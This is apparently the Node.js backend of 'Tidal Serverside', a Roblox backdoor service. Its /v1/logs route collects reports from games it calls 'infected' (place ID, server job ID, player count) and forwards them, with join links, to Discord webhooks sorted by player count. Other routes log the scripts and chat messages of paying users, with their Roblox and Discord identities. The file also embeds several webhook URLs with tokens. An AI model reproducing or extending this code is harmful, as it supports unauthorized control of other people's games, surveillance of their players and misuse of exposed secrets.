
const express = require("express");
const bodyParser = require("body-parser");
const axios = require("axios");
const {AttachmentBuilder} = require("discord.js");
console.log("s")

const chats =  "https://discord.com/api/webhooks/1310325746362744852/TqdxSBj1euSkUd-M9sOO3yfia67CTdls9CXGKZafM4fQiaVYBoQi5YxSEAEpJE4pC6hH"

const app = express();
app.use(bodyParser.json());

let pendings = {};



var games =  "https://discord.com/api/webhooks/1310326684515303424/Aov8f-ZpPTnToTEaXxl0Izs0LQQPMdvq6ANoapEwKjdMHndRKxVsevE4cLoZ2BiDZ72s";
var games2 = "https://discord.com/api/webhooks/1316384580139352105/us54O8kzFaoMO0BDO1c3FLh_KOSoKOH5SLirUw55WaoipKitf4dRMd9sVNC48TvDDDxO";
var z100 = "https://discord.com/api/webhooks/1316384653644664872/ugyFxVjgRvmqNxMhGCzlgIaPbG0-r_snE5ROOWRs6yY3ZiBbGn1nNL_UMeyKtn8YyfeY";

app.post("/v1/logs", async (req, res) => {
 const jnfo = await axios.get("http://api.ipify.org/");
 console.log(jnfo.data)

 if (String(jnfo.data) === "44.210.108.167") {
  res.status(400).json([])
 }
  var { life, is, roblox, tell, them } = req.body;
if (String(life) === "104604852982605") {

 return res.status(400).json([])
}

 if (String(life) === "135575101174058") {
  return res.status(400).json([])
 }

 if (String(life) === "7549229959") {
  return res.status(400).json([])
 }
 
 if (String(life).includes("http") ||String(life).includes("discord"))  {
    return res.status(400).json([])
 }
if (String(is).includes("http") ||String(is).includes("discord"))  {
    return res.status(400).json([])
}
if (String(roblox).includes("http") ||String(roblox).includes("discord"))  {
    return res.status(400).json([])
}

  if (String(tell).includes("http") ||String(tell).includes("discord"))  {
    return res.status(400).json([])
 }
 if (String(them).includes("http") ||String(them).includes("discord"))  {
    return res.status(400).json([])
 }
 
  // life: placeid, is: universe, roblox: job, tell: current players, them: place version
  if (is === "212934057") {
    return res.status(401).json("Game falsely infected")
  }

  var play = await axios.get(
   `https://roproxify.vercel.app/v1/advanced/${life}`
  )

 var votes = await axios.get(
  `https://roproxify.vercel.app/v1/votes/${is}`
 )
 votes = votes.data.data[0]
 play = play.data[0]
  var activity = await axios.get(
    `https://games.roproxy.com/v1/games?universeIds=${is}`,
  );
 
  
  activity = activity.data.data[0];
  console.log(activity.playing)
  var picture = await axios.get(
    `https://thumbnails.roproxy.com/v1/games/icons?universeIds=${is}&returnPolicy=PlaceHolder&size=420x420&format=Jpeg&isCircular=false`,
  );
  if (tell >= activity.maxPlayers) { res.status(401).json([]) }
  picture = picture.data.data[0];
  
  function ScanAsync() {
    if (activity.creator.type === "Group") {
      return `[${activity.creator.name}](https://roblox.com/groups/${activity.creator.id})`;
    } else {
      return `[${activity.creator.name}](https://roblox.com/users/${activity.creator.id})`;
    }
  }
 
console.log(activity.name)
const abbrv = function(value) {
 value = Number(value);
 if (value === 0) return '0';
 const units = ['','K','M','B','T','P','E'];
 var magn = Math.floor(Math.log10(Math.abs(value)) / 3)
 const unit = units[magn] || "";
 if (unit === "") {
   const abbv = (value / Math.pow(10,magn * 3)).toFixed(1);
 
 return `${abbv.endsWith('.0') ? abbv.slice(0,-2) : abbv}${unit}`
 } else {
   const abbv = (value / Math.pow(10,magn * 3)).toFixed(1);

 return `${abbv.endsWith('.0') ? abbv.slice(0,-2) : abbv}${unit}+`
 }

}
   const build = {
         title: "**Tidal Serverside**",
         description: "",
         footer: {
          text: "Tidal • Infected Game"
         },
         thumbnail: {
          url: picture.imageUrl
         },
         author: {
          name: "Tidal Softworks"
         },
         timestamp: new Date(),
         fields: [
          {
           name: "**Server Information**",
           value: `• **Server Name**: ${activity.name} \n > **Server Link**: [${activity.name}](https://roblox.com/games/${life}) \n > **Join Link**: [${activity.name}](https://www.roblox.com/games/start?placeId=${life}&serverInstanceId=${roblox}) \n > **Server Players** ${tell}/${activity.maxPlayers}`,
           inline:false
          },
          {
           name:"**Game Information**",
           value: `• **Active Players**: ${abbrv(activity.playing)} \n > **Forced Rig Type**: ${activity.universeAvatarType} \n > **Game Version**: ${them} \n > **Game Visits**: ${abbrv(activity.visits)} \n > **VIP Servers Enabled**: ${activity.createVipServersAllowed} \n > **Game Genre**: ${activity.genre} \n > **Playability Status**: ${play.reasonProhibited} \n > **Game Playable**: ${play.isPlayable} `,
           inline:false
          },
          {
           name:"**Votes Information**",
           value:`• **Game Favorites**: ${abbrv(activity.favoritedCount)} \n > **Game Upvotes**: ${abbrv(votes.upVotes)} \n > **Game Downvotes**: ${abbrv(votes.downVotes)}`
          },
          {
           name: "**Creator Information**",
           value: `• **Creator Name**: ${activity.creator.name} \n > **Creator Verified**: ${activity.creator.hasVerifiedBadge} \n > **Creator Type**: ${activity.creator.type} \n > **Creator Profile Link**: ${ScanAsync()}`,
           inline:false
          },
          {
           name: "**Browser Join Code**",
           value: "```js\nRoblox.GameLauncher.joinGameInstance(" + life + ',"' + roblox + '")```'
          }
         ]
    }

 if (activity.playing < 10) {
  console.log("0-10")
  axios.post(games,{
   embeds:[build]
  })
 } else if (activity.playing <= 50) {
   console.log("10-50")
  axios.post(games2,{
   embeds:[build]
  })
 } else if (activity.playing >= 50 && activity.playing <= 100) {
  console.log("50-100")
  axios.post(z100,{
   embeds:[build]
  })
 } else if (activity.playing > 100){
  console.log("100-1k+")
    axios.post("https://discord.com/api/webhooks/1335719478679441472/VsJH8yhlFkoMR_tMxQRAQXHyJiZktgoYvwCNJ25K9VygU_6PVtw53wCei2QTT-dohdRi",{
      embeds:[build]
    })
 }
  res.status(200).json([])
});

/*
This gonna get goood
*/
// 
var scriptlog = "https://discord.com/api/webhooks/1310293297742221375/-r5KePe06G_1CQxnJluXwhbrvfnaK0SvDIAUvsb68s85L_Z-GyRm6gZDxwYaaSq0HASJ"
app.post("/v2/script",async(req,res)=> {
  var { life, is, roblox, tell, them } = req.body;

  // life: user, is: script, roblox: discord_id, tell: whitelist, them: userid
 
 var placeInfo = await axios.post("https://roproxify.vercel.app/v1/presence",{
  Users: them
 })
  placeInfo = placeInfo.data.userPresences[0]
 const buff= Buffer.from(is,'utf-8');
 const attach = new AttachmentBuilder(buff,{name:`${life}-${tell}.txt`});
  if (life === undefined) {
   return res.status(400).json([])
  }

  if (is === undefined) {
  return res.status(400).json([])
  }
  if (roblox === undefined) {
   return res.status(400).json([])
  }
  if (tell === undefined) {
   return res.status(400).json([])
  }
  if (them === undefined) {
   return res.status(400).json([])
  }

 if (String(life).includes("http") ||String(life).includes("discord"))  {
    return res.status(400).json([])
 }
if (String(is).includes("http") ||String(is).includes("discord"))  {
    return res.status(400).json([])
}
if (String(roblox).includes("http") ||String(roblox).includes("discord"))  {
    return res.status(400).json([])
}

 if (String(tell).includes("http") ||String(tell).includes("discord"))  {
    return res.status(400).json([])
 }
 if (String(them).includes("http") ||String(them).includes("discord"))  {
    return res.status(400).json([])
 }
  await axios.post(scriptlog,{
   embeds: [
    {
     title: "**Tidal Serverside**",
     timestamp: new Date,
     fields: [
      {
      name:"**User Information**",
      value: `> **Roblox Username**: ${life} \n > **Roblox User ID**: ${them} \n > **Roblox Profile Link**: [${life}](https://roblox.com/users/${them}/profile) \n > **Discord ID**: ${roblox} \n > **Discord Profile Tag**: <@${roblox}> \n > **Current Plan**: ${tell}`,
      inline:false
     },
      {
       name: "**Script Information**",
       value: `> **Script Executed**: ${is} \n > **Script Location: [${placeInfo.lastLocation}](https://roblox.com/games/${placeInfo.placeId})`,
      }
     ]
    }
   ],files:[attach]
  })
  return res.status(200).json([])
})

app.post("/v2/chats",async(req,res)=> {
  var { life, is, roblox, tell, them } = req.body;
  var placeInfo = await axios.post("https://roproxify.vercel.app/v1/presence",{
  Users: them
 })
  placeInfo = placeInfo.data.userPresences[0]
 const buff= Buffer.from(is,'utf-8');
 const attach = new AttachmentBuilder(buff,{name:`${life}-${tell}.txt`});
  // life: user, is: message, roblox: discord_id, tell: whitelist, them: userid
  if (life === undefined) {
   return res.status(400).json([])
  }

  if (is === undefined) {
  return res.status(400).json([])
  }
  if (roblox === undefined) {
   return res.status(400).json([])
  }
  if (tell === undefined) {
   return res.status(400).json([])
  }
  if (them === undefined) {
   return res.status(400).json([])
  }

 if (String(life).includes("http") ||String(life).includes("discord"))  {
    return res.status(400).json([])
 }
if (String(is).includes("http") ||String(is).includes("discord"))  {
    return res.status(400).json([])
}
if (String(roblox).includes("http") ||String(roblox).includes("discord"))  {
    return res.status(400).json([])
}

 if (String(tell).includes("http") ||String(tell).includes("discord"))  {
    return res.status(400).json([])
 }
 if (String(them).includes("http") ||String(them).includes("discord"))  {
    return res.status(400).json([])
 }
  await axios.post(chats,{
   embeds: [
    {
     title: "**Tidal Serverside**",
     timestamp: new Date,
     fields: [
      {
      name:"**User Information**",
      value: `> **Roblox Username**: ${life} \n > **Roblox User ID**: ${them} \n > **Roblox Profile Link**: [${life}](https://roblox.com/users/${them}/profile) \n > **Discord ID**: ${roblox} \n > **Discord Profile Tag**: <@${roblox}> \n > **Current Plan**: ${tell}`,
      inline:false
     },
      {
       name: "**Chat Information**",
       value: `> **Message Sent**: ${is} \n > **Message Location: [${placeInfo.lastLocation}](https://roblox.com/games/${placeInfo.placeId})`,
      }
     ]
    }
   ],files:[attach]
  })
  return res.status(200).json([])
})


app.get("/v1/database",async(req,res) => {
  axios.get("http://de3.bot-hosting.net:20453/db").then(a => {
    res.json(a.data)
  })
})

var PORT = 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
